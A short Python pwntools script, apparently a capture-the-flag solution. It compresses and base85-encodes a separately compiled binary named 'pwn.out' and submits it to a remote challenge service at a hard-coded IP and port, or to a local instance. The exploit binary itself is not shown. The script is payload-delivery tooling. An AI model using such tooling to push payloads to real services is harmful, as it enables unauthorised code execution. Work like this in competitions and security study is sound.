import base64,gzip
from pwn import *
LOCAL=False
context.log_level='DEBUG'
pay=base64.b85encode(gzip.compress(open("pwn.out","rb").read()))
p=remote('30.222.0.2',39216) if not LOCAL else remote('localhost',10000)
p.sendlineafter(b'Enter your program: ',pay)
p.send(b'a')
p.shutdown()
#p.interactive()
